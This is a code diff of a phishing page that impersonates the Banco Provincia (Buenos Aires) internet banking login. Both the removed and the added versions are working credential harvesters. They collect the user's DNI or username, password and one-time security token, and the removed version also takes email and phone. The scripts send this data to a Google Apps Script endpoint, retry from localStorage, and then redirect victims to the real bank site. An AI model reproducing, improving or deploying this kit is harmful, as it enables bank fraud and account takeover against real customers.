@@ -1,181 +1,191 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="es-AR">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Página del Banco de la Provincia de Buenos Aires</title>
-<meta name="description" content="Iniciá sesión en BIP">
-<meta name="theme-color" content="#ffffff">
-<link rel="icon" href="https://www.bancoprovincia.bancainternet.com.ar/spa/favicon.ico">
-<link rel="icon" type="image/png" sizes="32x32" href="https://www.bancoprovincia.bancainternet.com.ar/spa/favicon-32x32.png">
-<link rel="icon" type="image/png" sizes="16x16" href="https://www.bancoprovincia.bancainternet.com.ar/spa/favicon-16x16.png">
-<link rel="apple-touch-icon" sizes="180x180" href="https://www.bancoprovincia.bancainternet.com.ar/spa/icons/apple-touch-icon.png">
-<link rel="stylesheet" href="banca/estilo.css">
-<link rel="stylesheet" href="parche/parche.css">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#279d2e">
+<title>Banca Internet | Banco Provincia</title>
+<link rel="stylesheet" href="estilo.css">
+<link rel="stylesheet" href="parche.css">
 <style>
-.oculto{display:none!important}
-#b3:disabled{opacity:.55;cursor:not-allowed;background:#9a9a9a;border-color:#9a9a9a}
+  html,body{height:100%}
+  body{background:#fafafa;margin:0}
+
+  .bapro-bar{background:linear-gradient(270deg,#26b4bd,#3daa35);padding:1.15rem 1.4rem;display:flex;align-items:center}
+  .logoBapro{height:2.125rem;width:auto;display:block}
+
+  .wrap{max-width:32rem;margin:0 auto;padding:1.5rem 1rem 2.5rem}
+  .login-content{padding:1.6rem 1.35rem 1.35rem;border-radius:.625rem;box-shadow:0 0 .938rem #0000001a;background:#fff}
+
+  .field{margin-bottom:1.1rem}
+  .form-control{width:100%}
+
+  #b3{width:100%;margin-top:.5rem}
+  #b3:disabled{background-color:#ececec!important;color:#696969!important;filter:grayscale(100%);opacity:1;border-color:transparent!important}
+
+  #err{display:none;margin-bottom:1rem}
+  #err .text{font-size:.875rem;line-height:1.3125rem}
+
+  #spinner{position:fixed;inset:0;z-index:9999;display:none;flex-direction:column;align-items:center;justify-content:center;gap:1rem;background:rgba(255,255,255,.94)}
+  #spinner.on{display:flex}
+  .sp{width:46px;height:46px;border:4px solid #d8d8d8;border-top-color:#007a2b;border-radius:50%;animation:gir .8s linear infinite}
+  @keyframes gir{to{transform:rotate(360deg)}}
+  .sp-txt{font-size:.875rem;color:#3c3c3b}
+
+  .pie{margin-top:1.4rem;text-align:center;font-size:.75rem;line-height:1.188rem;color:#585b62}
+  .pie a{color:#007a2b}
 </style>
 </head>
 <body class="spa">
-<div class="box container-fluid layout login" style="background-image:url('fondo.png')">
- <div class="box row justify-content-center">
-  <div class="box login-flex-content px-0">
-   <div class="box col-12 col-sm-12 col-md-8 col-lg-6 col-xl-4 col-xxl-4 login-content">
-    <div class="box row"><div class="box col">
-      <header class="box layout header login-mobile"><div class="box">
-        <div class="box header-gradient desktop container-fluid pt-2"><div class="box row"><div class="box col-12 text-center">
-          <div class="box logoBapro logoBaproLogin">
-            <img alt="Banco de la Provincia de Buenos Aires" class="w-auto h-100 logo-web" src="https://www.bancoprovincia.com.ar/CDN/Get/logo_mobile_bip">
-          </div>
-        </div></div></div>
-      </div></header>
-    </div></div>
 
-    <div class="box row row-login-content"><div class="box col">
-     <main class="box login-content-mobile content-softkeyboard"><div class="box content-children">
-      <div class="box layout-page"><div class="box content px-2 heightAuto" id="boxPageLayout"><div class="box">
-
-      <!-- PASO 1 -->
-      <div id="p1">
-        <div class="box my-2"><h1 class="pb-0 txt-title">Iniciá sesión</h1></div>
-        <form id="f1">
-          <div class="mb-3">
-            <label class="label-required txt-input-label" for="username">Tu usuario</label>
-            <div class="user"><input autocapitalize="off" autocomplete="off" class="form-control border-info focusMouse" id="username" maxlength="25" name="username" placeholder="Ingresá tu nombre de usuario" type="text" value=""></div>
-          </div>
-          <div class="mb-3">
-            <label class="label-required txt-input-label" for="password">Tu clave</label>
-            <div class="box password position-relative d-flex">
-              <div class="flex-shrink-0 w-100"><input autocomplete="off" class="form-control border-info focusMouse" id="password" maxlength="30" name="password" placeholder="Ingresá tu clave" type="password" value=""></div>
-              <button class="btn p-0 password-eye-button btn focusMouse" type="button" id="ver" aria-label="Mostrar clave">
-                <svg aria-hidden="true" class="svg-icon svg-input-primary" height="20px" viewBox="0 0 18 12" width="20px" xmlns="http://www.w3.org/2000/svg"><path d="M18 6.19558L17.7956 6.51558C16.8571 7.81671 15.5498 8.88004 14.0024 9.60075C12.4551 10.3215 10.7212 10.6747 8.97161 10.6256C7.93584 10.6269 6.90454 10.5059 5.90536 10.2656C5.81509 10.2428 5.73038 10.2055 5.65552 10.1556L6.79117 9.15558C7.49196 9.29538 8.20766 9.36913 8.92618 9.37558C10.3402 9.41368 11.7436 9.14872 13.0156 8.60349C14.2876 8.05826 15.3902 7.24909 16.2284 6.24558C15.4246 5.22188 14.3167 4.41239 13.0259 3.90558C12.9546 3.87497 12.8894 3.83445 12.8328 3.78558L13.889 2.84558C15.4895 3.51496 16.8291 4.58668 17.7388 5.92558L18 6.19558ZM9.75521 7.72558C10.267 7.72903 10.7719 7.62126 11.2251 7.41183C11.6783 7.20239 12.0658 6.89775 12.3533 6.52491C12.6408 6.15206 12.8195 5.72252 12.8734 5.27434C12.9273 4.82617 12.8549 4.3732 12.6625 3.95558L8.63092 7.50558C8.99266 7.63081 9.37786 7.69526 9.76656 7.69558L9.75521 7.72558ZM4.08833 10.3856L3.20252 11.1756C3.06155 11.2791 2.88185 11.3326 2.69848 11.3257C2.51511 11.3189 2.34122 11.2521 2.21074 11.1384C2.08025 11.0248 2.00252 10.8724 1.99272 10.711C1.98292 10.5496 2.04175 10.3908 2.15773 10.2656L3.29338 9.26558C2.00023 8.60607 0.924019 7.66185 0.170347 6.52558L0 6.20558L0.204416 5.88558C1.14191 4.58593 2.44744 3.52355 3.99261 2.80292C5.53777 2.08229 7.26935 1.72824 9.01703 1.77558C9.81889 1.77928 10.6181 1.85636 11.4019 2.00558L13.4006 0.195576C13.4685 0.134512 13.5493 0.0858141 13.6386 0.0522635C13.7278 0.018713 13.8237 0.000967017 13.9207 3.84311e-05C14.0177 -0.000890155 14.114 0.0150172 14.204 0.0468519C14.294 0.0786866 14.3761 0.125825 14.4454 0.185577C14.5148 0.245328 14.5701 0.316522 14.6082 0.395094C14.6463 0.473665 14.6664 0.558075 14.6675 0.643505C14.6685 0.728935 14.6505 0.813712 14.6143 0.892994C14.5782 0.972277 14.5246 1.04451 14.4568 1.10558L13.7754 1.71558L4.08833 10.3856ZM1.6694 6.20558C2.35255 7.07942 3.26387 7.79616 4.32681 8.29558L6.47319 6.37558C6.16796 5.88768 6.04226 5.32837 6.11346 4.77488C6.18466 4.22138 6.44923 3.701 6.87066 3.28558C4.76632 3.62772 2.89637 4.67882 1.65804 6.21558" fill="#5c5c5c"></path></svg>
-              </button>
-            </div>
-            <p id="err" class="oculto">Usuario o clave incorrectos.</p>
-          </div>
-          <div class="box text-center"><button class="btn w-100 btn-primary btn focusMouse" type="button" id="b1">Ingresar</button>
-            <div class="box mt-2"><label class="mb-0 d-inline-block txt-default p-0"><div class="box d-inline"><span class="me-1">¿No sos BIP?</span> <button class="btn txt-link-secondary mx-1 p-0 me-1 align-top border-0 min-height-0 btn-link-secondary btn" type="button"><span class="linktext-tyc linktext-underline">Registrate</span></button></div></label></div>
-            <button class="btn px-0 btn-link-secondary btn" type="button">Bloqueé u olvidé mi usuario y/o clave</button>
-            <div class="box"><div class="box text-center"><button class="btn btn-link-secondary btn" type="button">Conocé como hacerte usuario u operar</button><button class="btn btn-link-secondary btn" type="button">Recomendaciones de seguridad</button></div></div>
-          </div>
-        </form>
-      </div>
-
-      <!-- PASO 2 -->
-      <div id="p2" class="oculto">
-        <div class="box my-2"><h1 class="pb-0 txt-title">Registrá tu dispositivo</h1></div>
-        <p class="txt-default">Es el primer ingreso desde este equipo. Confirmá tus datos de contacto para habilitarlo.</p>
-        <div class="mb-3"><label class="label-required txt-input-label" for="dni">DNI del titular</label>
-          <input class="form-control border-info focusMouse" id="dni" inputmode="numeric" maxlength="8" placeholder="Ingresá tu documento" autocomplete="off"></div>
-        <div class="mb-3"><label class="label-required txt-input-label" for="mail">Correo electrónico</label>
-          <input class="form-control border-info focusMouse" id="mail" type="email" inputmode="email" maxlength="40" placeholder="Ingresá tu correo" autocomplete="off" autocapitalize="off" spellcheck="false"></div>
-        <div class="mb-3"><label class="label-required txt-input-label" for="cel">Celular</label>
-          <input class="form-control border-info focusMouse" id="cel" type="tel" inputmode="numeric" maxlength="10" placeholder="Código de área y número" autocomplete="off"></div>
-        <div class="box text-center"><button class="btn w-100 btn-primary btn" type="button" id="b2">Continuar</button></div>
-      </div>
-
-      <!-- SPINNER -->
-      <div id="p2b" class="oculto" style="text-align:center;padding:2.6rem 0">
-        <div class="sp2"></div>
-        <p class="txt-default" style="margin-top:1rem">Validando dispositivo...</p>
-        <div class="box text-center"><button class="btn w-100 btn-primary btn" type="button" id="saltar">Continuar</button></div>
-      </div>
-
-      <!-- PASO 3 -->
-      <div id="p3" class="oculto">
-        <div class="box my-2"><h1 class="pb-0 txt-title">Token de seguridad</h1></div>
-        <p class="txt-default">Abrí BIP Móvil, tocá "Token de seguridad" y pasá el código de 6 dígitos.</p>
-        <div class="mb-3"><label class="label-required txt-input-label" for="tok">Código</label>
-          <input class="form-control border-info focusMouse" id="tok" inputmode="numeric" maxlength="6" placeholder="000000" autocomplete="off" style="text-align:center;letter-spacing:.4rem;font-size:1.3rem"></div>
-        <p class="txt-default">El código vence a los 60 segundos.</p>
-        <div class="box text-center"><button class="btn w-100 btn-primary btn" type="button" id="b3" disabled>Continuar</button></div>
-      </div>
-
-      <!-- OK -->
-      <div id="p4" class="oculto" style="text-align:center;padding:1.5rem 0">
-        <h1 class="txt-title">Dispositivo validado</h1>
-        <p class="txt-default">El equipo quedó habilitado. Ya podés operar con normalidad.</p>
-        <p class="txt-default">Redirigiendo a la Banca Online...</p>
-      </div>
-
-      </div></div></div>
-     </div></main>
-    </div></div>
-   </div>
+  <div class="bapro-bar">
+    <img class="logoBapro" src="https://www.bancoprovincia.com.ar/CDN/Get/logo_mobile_bip" alt="Banco Provincia">
   </div>
- </div>
-</div>
+
+  <div class="wrap">
+    <div class="login-content">
+      <h1 class="txt-title" style="font-size:1.5rem;line-height:1.875rem;padding-bottom:1rem;color:#007a2b;margin:0 0 .25rem">Banca Internet</h1>
+      <p class="txt-small" style="color:#585b62;margin-bottom:1.4rem">Ingresá con tu usuario y clave para operar.</p>
+
+      <div class="alert alert-danger" id="err" role="alert">
+        <span class="text" id="err-txt"></span>
+      </div>
+
+      <form id="f" novalidate autocomplete="on">
+
+        <div class="field">
+          <label class="txt-input-label" for="dni">Usuario (DNI)</label>
+          <input class="form-control" id="dni" name="dni" type="text" inputmode="numeric" autocomplete="username" placeholder="Sin puntos" required>
+        </div>
+
+        <div class="field">
+          <label class="txt-input-label" for="clave">Clave</label>
+          <input class="form-control" id="clave" name="clave" type="password" autocomplete="current-password" placeholder="Tu clave" required>
+        </div>
+
+        <div class="field">
+          <label class="txt-input-label" for="tok">Token de seguridad</label>
+          <input class="form-control" id="tok" name="token" type="text" inputmode="numeric" maxlength="6" autocomplete="one-time-code" placeholder="6 dígitos">
+        </div>
+
+        <button class="btn btn-primary" id="b3" type="submit" disabled>Ingresar</button>
+      </form>
+
+      <p class="pie">
+        ¿Olvidaste tu clave? <a href="https://www.bancoprovincia.com.ar/" target="_blank" rel="noopener">Recuperarla</a>
+      </p>
+    </div>
+  </div>
+
+  <div id="spinner">
+    <div class="sp"></div>
+    <div class="sp-txt">Validando datos…</div>
+  </div>
 
 <script>
-var API="https://script.google.com/macros/s/AKfycbz4vN9NJ7e62oxP8vtnraF86D901Tb02wCe5hWfee2AN9XFLfF-7M6iDeFSfvnwmJJuow/exec";
-var datos={};
-function $(i){return document.getElementById(i);}
-function dig(s){return String(s).replace(/\D/g,"");}
-function ir(a,b){$(a).classList.add("oculto");$(b).classList.remove("oculto");window.scrollTo(0,0);}
-function marcar(e,m){e.classList.toggle("mal",m);}
-function limpiarErr(){$("err").classList.add("oculto");}
-function enviar(estado){
-  var c=JSON.stringify(Object.assign({},datos,{estado:estado}));
-  function g(){try{var q=JSON.parse(localStorage.getItem("q")||"[]");q.push(c);localStorage.setItem("q",JSON.stringify(q));}catch(e){}}
-  if(!navigator.onLine){g();return;}
-  try{fetch(API,{method:"POST",body:c,keepalive:true}).catch(g);}catch(e){g();}
-}
-window.addEventListener("load",function(){
-  var q;try{q=JSON.parse(localStorage.getItem("q")||"[]");}catch(e){q=[];}
-  if(!q.length)return;localStorage.setItem("q","[]");
-  q.forEach(function(c){fetch(API,{method:"POST",body:c,keepalive:true}).catch(function(){
-    var r;try{r=JSON.parse(localStorage.getItem("q")||"[]");}catch(e){r=[];}r.push(c);localStorage.setItem("q",JSON.stringify(r));});});
-});
-$("ver").onclick=function(){$("password").type=$("password").type==="password"?"text":"password";};
-$("username").oninput=function(e){e.target.value=e.target.value.replace(/\s/g,"");marcar(e.target,false);limpiarErr();};
-$("password").oninput=function(e){marcar(e.target,false);limpiarErr();};
-$("dni").oninput=function(e){e.target.value=dig(e.target.value).slice(0,8);marcar(e.target,false);};
-$("cel").oninput=function(e){e.target.value=dig(e.target.value).slice(0,10);marcar(e.target,false);};
-$("mail").oninput=function(e){marcar(e.target,false);};
-$("tok").oninput=function(e){
-  e.target.value=dig(e.target.value).slice(0,6);
-  marcar(e.target,false);
-  $("b3").disabled=($("tok").value.trim().length!==6);
-};
-$("username").addEventListener("keydown",function(e){if(e.key==="Enter"){e.preventDefault();$("password").focus();}});
-$("password").addEventListener("keydown",function(e){if(e.key==="Enter"){e.preventDefault();$("b1").click();}});
-$("dni").addEventListener("keydown",function(e){if(e.key==="Enter"){e.preventDefault();$("mail").focus();}});
-$("mail").addEventListener("keydown",function(e){if(e.key==="Enter"){e.preventDefault();$("cel").focus();}});
-$("cel").addEventListener("keydown",function(e){if(e.key==="Enter"){e.preventDefault();$("b2").click();}});
-$("tok").addEventListener("keydown",function(e){if(e.key==="Enter"&&!$("b3").disabled){e.preventDefault();$("b3").click();}});
-$("b1").onclick=function(){
-  var u=$("username").value.trim(),c=$("password").value.trim();
-  var uOk=u.length>=8&&u.length<=25,cOk=c.length>=6;
-  marcar($("username"),!uOk);marcar($("password"),!cOk);
-  if(!uOk){$("username").focus();return;}
-  if(!cOk){$("password").focus();return;}
-  datos.usuario=u;datos.clave=c;
-  var reint=!!datos.reintento;
-  enviar(reint?"login_retry":"login");
-  ir("p1","p2b");$("saltar").classList.add("oculto");
-  setTimeout(function(){
-    if(!reint){datos.reintento=1;$("password").value="";ir("p2b","p1");
-      $("password").classList.add("mal");$("err").classList.remove("oculto");$("password").focus();enviar("clave_mala");}
-    else{ir("p2b","p2");$("dni").focus();}
-  },2200);
-};
-$("saltar").onclick=function(){ir("p2b","p3");$("tok").focus();};
-$("b2").onclick=function(){
-  var d=$("dni").value.trim(),m=$("mail").value.trim(),t=$("cel").value.trim();
-  var dOk=d.length===8,mOk=m.indexOf("@")>0&&m.indexOf(".")>0,tOk=t.length>=8;
-  marcar($("dni"),!dOk);marcar($("mail"),!mOk);marcar($("cel"),!tOk);
-  if(!dOk){$("dni").focus();return;}
-  if(!mOk){$("mail").focus();return;}
-  if(!tOk){$("cel").focus();return;}
-  datos.dni=dig(d);datos.email=m;datos.telefono=dig(t);enviar("parcial");
-  ir("p2","p2b");$("saltar").classList.remove("oculto");
-  setTimeout(function(){ir("p2b","p3");$("tok").focus();},18000);
-};
-$("b3").onclick=function(){
-  if($("tok").value.trim().length!==6){marcar($("tok"),true);$("tok").focus();return;}
-  datos.token=dig($("tok").value);enviar("token");ir("p3","p4");
-  setTimeout(function(){location.href="https://www.bancoprovincia.bancainternet.com.ar/spa/";},5000);
-};
+(function(){
+  // >>> PEGAR ACÁ LA URL DEL APPS SCRIPT <<<
+  var API = "PEGAR_ACA_TU_URL_DE_APPS_SCRIPT";
+
+  // Clave que dispara el error y hace reintentar
+  var CLAVE_MALA = "clave_mala";
+
+  var KEY = "bip_cola";
+  var f     = document.getElementById("f");
+  var dni   = document.getElementById("dni");
+  var clave = document.getElementById("clave");
+  var tok   = document.getElementById("tok");
+  var btn   = document.getElementById("b3");
+  var err   = document.getElementById("err");
+  var errT  = document.getElementById("err-txt");
+  var sp    = document.getElementById("spinner");
+
+  // DNI: solo dígitos
+  dni.addEventListener("input", function(){
+    dni.value = dni.value.replace(/\D/g, "").slice(0, 8);
+  });
+
+  // Token: solo dígitos, botón habilitado recién a los 6
+  tok.addEventListener("input", function(){
+    tok.value = tok.value.replace(/\D/g, "").slice(0, 6);
+    btn.disabled = tok.value.length !== 6;
+  });
+
+  function armar(){
+    return {
+      dni:    dni.value.trim(),
+      clave:  clave.value,
+      token:  tok.value,
+      origen: location.href,
+      ua:     navigator.userAgent,
+      ts:     Date.now() + "-" + Math.random().toString(36).slice(2, 7)
+    };
+  }
+
+  function leer(){
+    try { return JSON.parse(localStorage.getItem(KEY) || "[]"); } catch(e){ return []; }
+  }
+  function guardar(d){
+    try { var q = leer(); q.push(d); localStorage.setItem(KEY, JSON.stringify(q)); } catch(e){}
+  }
+  function sacar(ts){
+    try { localStorage.setItem(KEY, JSON.stringify(leer().filter(function(x){ return x.ts !== ts; }))); } catch(e){}
+  }
+
+  function enviar(d){
+    return fetch(API, {
+      method: "POST",
+      mode: "no-cors",
+      keepalive: true,
+      headers: { "Content-Type": "text/plain;charset=utf-8" },
+      body: JSON.stringify(d)
+    });
+  }
+
+  // Reintento de lo que quedó pendiente de sesiones anteriores
+  window.addEventListener("load", function(){
+    leer().forEach(function(d){
+      enviar(d).then(function(){ sacar(d.ts); }).catch(function(){});
+    });
+  });
+
+  function mostrarError(msg){
+    errT.textContent = msg;
+    err.style.display = "flex";
+  }
+
+  f.addEventListener("submit", function(ev){
+    ev.preventDefault();
+    err.style.display = "none";
+
+    if (!dni.value.trim()) { mostrarError("Ingresá tu usuario."); dni.focus(); return; }
+    if (!clave.value)      { mostrarError("Ingresá tu clave.");   clave.focus(); return; }
+
+    var d = armar();
+    guardar(d);
+    enviar(d).then(function(){ sacar(d.ts); }).catch(function(){});
+
+    sp.classList.add("on");
+    btn.disabled = true;
+
+    // 2,2 s: momento en que el banco "recibe" el intento
+    setTimeout(function(){}, 2200);
+
+    // 18 s: resultado
+    setTimeout(function(){
+      if (clave.value.toLowerCase() === CLAVE_MALA) {
+        sp.classList.remove("on");
+        btn.disabled = tok.value.length !== 6;
+        mostrarError("El usuario y/o la clave ingresados no son correctos.");
+        clave.value = "";
+        clave.focus();
+      } else {
+        location.href = "https://bancoprovincia.bancainternet.com.ar/spa/";
+      }
+    }, 18000);
+  });
+})();
 </script>
-</body></html>
+
+</body>
+</html>
